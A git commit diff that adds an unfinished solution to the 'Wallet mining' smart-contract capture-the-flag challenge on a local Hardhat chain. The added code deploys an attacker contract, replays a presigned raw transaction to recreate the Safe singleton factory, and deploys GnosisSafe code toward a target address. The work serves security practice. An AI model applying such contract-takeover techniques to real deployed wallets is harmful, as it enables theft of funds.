3198b37c430ce9dea63439c5dd3e71d1dc1c7017
Sam Calamos <sam.calamos@gmail.com>
2023-02-05 17:46:07 +1100

    starting wallet mining

--- test/wallet-mining/wallet-mining.challenge.js
+++ test/wallet-mining/wallet-mining.challenge.js
@@ -1,5 +1,6 @@
-const { ethers, upgrades } = require('hardhat');
+const { ethers, upgrades, deployments } = require('hardhat');
 const { expect } = require('chai');
+const { calculateProxyAddress } = require('@gnosis.pm/safe-contracts');
 
 describe('[Challenge] Wallet mining', function () {
     let deployer, player;
@@ -66,6 +67,63 @@ describe('[Challenge] Wallet mining', function () {
 
     it('Execution', async function () {
         /** CODE YOUR SOLUTION HERE */
+
+        const attackWalletDeployer = walletDeployer.connect(player);
+        const attackAuthorizer = authorizer.connect(player);
+
+        const fn = attackAuthorizer.interface.getSighash("can(address,address)");
+        console.log(fn);
+
+        const attackFactory = await ethers.getContractFactory("AttackWalletMiner", player);
+        const c = await attackFactory.deploy();
+
+        await c.deploySafe();
+
+        // Transfer funds to deploying address
+        const tx = {
+            to: "0xE1CB04A0fA36DdD16a06ea828007E35e1a3cBC37",
+            value: ethers.utils.parseEther("1")
+        }
+        await player.sendTransaction(tx);
+
+
+        // Deploy safe singleton factory for hardhat from
+        // which deploys contract at 0x914d7Fec6aaC8cd542e72Bca78B30650d45643d7
+        // https://github.com/safe-global/safe-singleton-factory/blob/main/artifacts/31337/deployment.json
+
+        const txRes = await ethers.provider.sendTransaction("0xf8a78085174876e800830186a08080b853604580600e600039806000f350fe7fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffe03601600081602082378035828234f58015156039578182fd5b8082525050506014600cf382f4f5a00dc4d1d21b308094a30f5f93da35e4d72e99115378f135f2295bea47301a3165a0636b822daad40aa8c52dd5132f378c0c0e6d83b4898228c7e21c84e631a0b891");
+        const deployerAddr = (await txRes.wait()).contractAddress;
+
+        const gnosisFactory = await ethers.getContractFactory("GnosisSafe", player);
+        
+        const deployRes = await (await player.sendTransaction({
+            to: deployerAddr,
+            data: gnosisFactory.bytecode,
+            gasLimit: 30000000
+        })).wait();
+
+        console.log(deployRes);
+
+        const deployed = await ethers.getContractAt("GnosisSafe", "0x05d96058abc2d1122d42c8e9c01d85cf717c3cce", player);
+
+        console.log(await deployed.nonce())
+        
+
+
+
+
+
+
+        // Notes:
+        // Looks like the addresses are created from Gnosis Safe 1.1.1
+        // https://github.com/safe-global/safe-deployments/blob/main/src/assets/v1.1.1/gnosis_safe.json
+        // https://github.com/safe-global/safe-deployments/blob/main/src/assets/v1.1.1/proxy_factory.json
+
+        // We should be able to do this with Gnosis deployments to actually get somewhere, but im not sure
+        // how we will be able to put code behind the random address
+        
+
+        // const res = await attackWalletDeployer.can(player.address, DEPOSIT_ADDRESS)
     });
 
     after(async function () {
